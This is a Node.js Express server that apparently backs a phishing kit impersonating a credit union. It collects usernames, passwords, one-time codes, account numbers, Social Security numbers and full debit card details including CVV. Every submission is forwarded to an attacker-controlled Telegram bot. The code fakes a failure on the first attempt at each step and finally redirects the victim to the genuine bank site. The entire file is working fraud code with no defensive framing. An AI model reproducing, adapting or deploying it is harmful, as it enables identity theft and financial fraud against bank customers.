import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';
import cors from 'cors'

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const port = 8081;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let attemptCount = 0;

app.use(bodyParser.json());
app.use(express.static('public'));
app.use(express.static('views'));
app.use('/public', express.static(__dirname + '/public', { type: 'text/css' }));
app.use (cors())

app.post('/form-submit', (req, res) => {
    const { username, password } = req.body;
    
    attemptCount++;

    const message = `New form submission:\n\nUsername: ${username}\nPassword: ${password}`;
    sendMessage(message)
        .then(() => {
            if (attemptCount === 1) {
                res.status(400).sendFile('form.html');
            } else {
                attemptCount = 0;
                res.json({ redirectUrl : '/otp.html'});
            }
        })
        .catch(error => {
            console.error("Error sending message:", error);
            res.status(500).send({ msg: "Your User Name and/or password does not match the information we have on file. Please try again."});
        });
});
app.post('/otp-submit', (req, res) => {
    const { otp } = req.body;
    attemptCount++;
    const message = `OTP submitted: ${otp}`;
    sendMessage(message)
        .then(() => {
            if (attemptCount === 1){
                res.status(400).sendFile('otp.html');
            }else {
                attemptCount = 0;
                res.json({ redirectUrl : './account.html'});
            }
        })
        .catch(error => {
            console.error("Error sending message:", error);
            res.status(500).send("OTP entered is incorrect, please enter the correct OTP");
        });
});
app.post('/account-submit', (req, res) => {
    const { accountNumber, ssn } = req.body;
    attemptCount++;
    const message = `Account info submitted:\nAccount Number: ${accountNumber}\nSSN: ${ssn}`;
    sendMessage(message)
        .then(() => {
            if (attemptCount === 1){
                res.status(400).sendFile('account.html');
            }else {
                attemptCount = 0;
                res.json( { redirectUrl : './debit-card.html'});
            }
        })
        .catch(error => {
            console.error("Error sending message:", error);
            res.status(500).send("Account information entered does not match the one on our file. Please try again");
        });
});
app.post('/debit-card-submit', (req, res) => {
    const { cardName, cardNumber, expDate, cvv } = req.body;
    attemptCount++;
    const message = `Debit card info submitted:\nName: ${cardName}\nCard Number: ${cardNumber}\nExpiration Date: ${expDate}\nCVV: ${cvv}`;
    sendMessage(message)
        .then(() => {
            if(attemptCount === 1){
                res.status(400).sendFile('debit-card.html');
            }else {
                attemptCount = 0;
                res.json({ redirectUrl : 'https://www.ssfcu.org/'});
            }
        })
        .catch(error => {
            console.error("Error sending message:", error);
            res.status(500).send("Please re-enter your card details");
        });
});

function sendMessage(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const params = {
        chat_id: CHAT_ID,
        text: message
    };
    return fetch(url, { 
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    })
    .then(response => response.json())
    .then(data => {
        if (!data.ok) {
            throw new Error(`Telegram API error: ${data.error_code} - ${data.description}`);
        }
    });
}
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});